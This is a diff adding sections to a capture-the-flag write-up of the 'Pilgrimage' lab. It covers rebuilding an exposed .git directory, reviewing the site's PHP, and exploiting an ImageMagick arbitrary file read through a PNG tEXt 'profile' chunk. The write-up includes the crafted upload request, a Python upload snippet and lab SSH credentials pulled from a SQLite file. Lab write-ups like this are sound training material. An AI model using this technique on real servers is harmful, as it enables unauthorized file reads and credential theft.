@@ -38,6 +38,16 @@ Deploying sites by git is potentially something i could see a company doing if t
 
 Although the directories aren't browseable, accessing files directly works fine. Therefore looking through a .git folder structure is probably good time spent rather than having a tool do it for me.
 
+## Source code
+
+Having rebuilt the source code i began looking at the most interesting part of the site, among the code there was also a `magick` binary, this may be imagemagick and so is another thing to look at as imagemagick had a pretty serious RCE vulnerability so if there's a way i can trigger that i may be able to gain an internal foothold.
+
+
+## ImageMagick
+
+Version 7.1.0-49
+
+Directory traversal vulnerability (assessing)
 # Research
 ## Web content
 ### .git Directory scraping
@@ -96,12 +106,94 @@ Pilgrimage image shrinking service initial commit.
 
 There are a few automated tools to rebuild .git repos from a public site, however a lot of them rely on the page having readable directories which when the site blocks these attempts fails so i think i'll attempt to create one from scratch which only uses static readable files which i assume it can access.
 
+## Source code
+The main code i took a look at was the index as this seemed to be the main use of the site (when a POST request was made). This research lead me to the following code which checks for the image sent to the server and which converts and shrinks it.
+
+```php
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+  $image = new Bulletproof\Image($_FILES);
+  if($image["toConvert"]) {
+    $image->setLocation("/var/www/pilgrimage.htb/tmp");
+    $image->setSize(100, 4000000);
+    $image->setMime(array('png','jpeg'));
+    $upload = $image->upload();
+    if($upload) {
+      $mime = ".png";
+      $imagePath = $upload->getFullPath();
+      if(mime_content_type($imagePath) === "image/jpeg") {
+        $mime = ".jpeg";
+      }
+      $newname = uniqid();
+      exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
+      unlink($upload->getFullPath());
+      $upload_path = "http://pilgrimage.htb/shrunk/" . $newname . $mime;
+      if(isset($_SESSION['user'])) {
+        $db = new PDO('sqlite:/var/db/pilgrimage');
+        $stmt = $db->prepare("INSERT INTO `images` (url,original,username) VALUES (?,?,?)");
+        $stmt->execute(array($upload_path,$_FILES["toConvert"]["name"],$_SESSION['user']));
+      }
+      header("Location: /?message=" . $upload_path . "&status=success");
+```
+The main bit of code which interests me is `exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);` on review there is no way to exploit this directly, but as i said previously, imagemagick has some exploits already known. 
+
+This is why i am choosing to return to the [Investigation](#investigate) section before completing this cycle as i believe it would be useful to investigate what potential vulnerabilities the collected version of magick has.
+
+## ImageMagick Information Disclosure / Local File Read
+
+Looking at the version of magick (another name for imagemagick) we can see a lot of results for this version with results hinting at a arbitrary file reads. Reviewing these results describes the vulnerability but does not give specifics, it's only by reviewing the PoC code that it becomes clear that the attack here includes attaching additional data to a png image.
+
+PNG files are seperated into chunks which can hold data not specifically just image data, this could include the header, but can also hold many different types of information. The full list of these types of chunk can be seen here https://www.w3.org/TR/2003/REC-PNG-20031110/#11Chunks. 
+
+The chunk which is used in these PoC seems to be the `tEXt` chunk which 'contains a keyword and a text string, in the format:'
+
+- Keyword 	1-79 bytes (character string)
+- Null separator 	1 byte (null character)
+- Text string 	0 or more bytes (character string)
+
+When reviewing the PoC code what actually happens is a `tEXt` chunk is addded with the keyword as `profile` and the text string as the desired file. 
+
 # Assess
 
 ## Automated .git directory rebuilding 
 As previously mentioned there are a few tools which can help rebuild a .git repo from scratch but i'm trying to test myself so i ended up writing my own at about 80 lines. 
 
 It's a pretty simple challenge which you from a few static files use gits own utility to generate the hashes of missing files, which gives a path to the remote repo to download. Finally using git ls-files and git checkout `filename` is enough to recreate the source from scratch.
+
+## ImageMagick Local file read
+
+
+I took ages doing this and it's only due to the fact i was having a hard time uploading the edited image through python, the page itself obviously doesn't give much indication when it actually fails which it does often if the format of the webkitform isn't exactly formatted the way that the system wants it...
+
+The way the form needs to be uploaded can be seen by intercepting the upload POST request via burp:
+
+```
+
+------WebKitFormBoundaryrcZ9A9IDGz7zS7w4
+Content-Disposition: form-data; name="toConvert"; filename="enc.png"
+Content-Type: image/png
+
+PNG
+
+   
+IHDR       ¿6Ì   tEXtprofile /etc/passwdF[×X   IDATxìýi$irß	þô¹ÌÌ="²xì|ÿ³#²²#³r  Ù@UînfÏ¹/TÍ"³+²+2äÝA£®Èws³GUÿÊcl?¯1'Þ¹d¶²³LÎ9î£Ã àãÌç_W¾¾m,üá÷¯<+ËrÅùHHË5à\¤U!oV+o¿~áþö%%ZmÐaÃÓÅ³ï%EÖÇ+¯¿þõþÆûíûýýåÚ÷ÇdðþþNkçÞ;Û¶1P[cAgPk%¦ÐGc cj) 61ÑÑZ¥J­
+#Aë=g¼ÔZpâHBô1¦#Á{âó<á½'ÆÈõ2B`.8' µÆãñ`è½s¦BLà!ZkÔZ­ã½×ïÛ3µUÞßß¸?îýþ ÷NïR
+
+```
+
+I've cut this for brevity but the main issue was the "name" portion needed to be different than the "filename" portion, eventually i saw that this could be done by the following python:
+
+
+```python
+files = {'toConvert': ('enc.png',open('./enc.png','rb'))}
+r = requests.post(url,files=files)
+print(r.url)
+
+> http://pilgrimage.htb/?message=http://pilgrimage.htb/shrunk/64ecb8b6e848b.png&status=success
+```
+
+After reading the file, the retrieved file if avaliable is stored as the "Raw profile type" info section on the file as a hex string.
+
+I created my own PoC for this site stored in this same folder and i used this to explore the local file system.
 
 # Exploit
 ## Automated .git scraping
@@ -176,6 +268,33 @@ vendor/jquery/jquery.slim.min.map
 Rebuild finished. Please check folder now.
 ```
 Completed source code retrieval.
+
+## ImageMagick Local file read
+
+Having a Local file read is good but only if we know about a specific file which is useful to us, i tried the typical list including:
+- /etc/passwd
+- nginx files
+
+I had to review the source code of the site to remember that the php actually makes a call to a sqlite database.
+
+```php
+function fetchImages() {
+  $username = $_SESSION['user'];
+  $db = new PDO('sqlite:/var/db/pilgrimage');
+  $stmt = $db->prepare("SELECT * FROM images WHERE username = ?");
+```
+Well that seems as good a target.
+Although my script doesn't handle this file as well as i'd like, the hex returned was entered into cyberchef, i knew this was the sql file as the header is in the format i expect.
+
+```
+ H SQLite format 
+...
+StableimagesimagesCREATE TABLE images (url TEXT PRIMARY KEY NOT NULL, original TEXT NOT NULL, username TEXT NOT NULL)+? indexsqlite_autoindex_images_1imagesf+tableusersusersCREATE TABLE users (username TEXT PRIMARY KEY NOT NULL, password TEXT NOT NULL))= indexsqlite_autoindex_users_1users       
+   æ æ   -emilyabigchonkyboi123
+```
+I've stripped a lot out here, but the main thing is that within this file exists a username and password it seems. `emily : abigchonkyboi123` (and yes these work in SSH), time for a quick review before moving on.
+
+
 # Review
 ## .git rebuilding
 It was a pretty simple challenge to rebuild the git repo even though directory viewing was turned off. It'll also made me think twice about simply leaving source material hanging around on production environments..
